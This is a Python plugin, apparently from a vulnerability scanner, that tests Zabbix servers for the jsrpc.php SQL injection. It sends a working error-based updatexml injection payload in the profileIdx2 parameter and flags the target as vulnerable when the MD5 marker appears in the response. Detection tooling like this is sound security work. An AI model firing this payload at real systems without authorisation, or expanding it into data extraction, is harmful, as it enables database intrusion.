#!/usr/bin/python
# -*- coding: utf-8 -*-

from engine.engine_utils.common import *
from urlparse import urlparse
from engine.logger import scanLogger as logger


def run_url(http, ob, item):
    header = {
        "Host": ob['domain'],
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Referer": item['refer'],
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        # "Cookie": ob.get('cookie')
    }
    try:
        path = item['url']
        params = item['params']
        method = item['method']
        timeout = ob.get('webTimeout')
        pattern = r'/jsrpc.php'

        result = []
        if not re.search(pattern, path, re.I):
            pass
        else:
            url_parse = urlparse(path)
            scheme = url_parse.scheme
            netloc = url_parse.netloc
            query = "type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=" \
                    "web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x36),1)+or+1=1)%23&updateProfile=" \
                    "true&period=3600&stime=20160817050632&resourcetype=17"
            source_ip = ob.get('source_ip')
            if source_ip:
                netloc = source_ip
            new_url = "%s://%s/%s?%s" % (scheme, netloc, url_parse.path, query)
            res, content = http.request(new_url, 'GET', headers=header)
            if re.search(r'c5a880faf6fb5e6087eb1b2dc', content, re.I):
                detail = "存在zabbix jsrpc SQL注入漏洞"
                response = getResponse(res, content, keywords='c5a880faf6fb5e6087eb1b2dc')
                request = getRequest(new_url, 'GET', headers=header, domain=ob['domain'])
                result.append(getRecord(ob, new_url, ob['level'], detail, request, response))
        return result

    except Exception, e:
        logger.error("File:zabbix_jsrpc_sqlinj_url.py, run_url function :%s" % (str(e)))
        return result
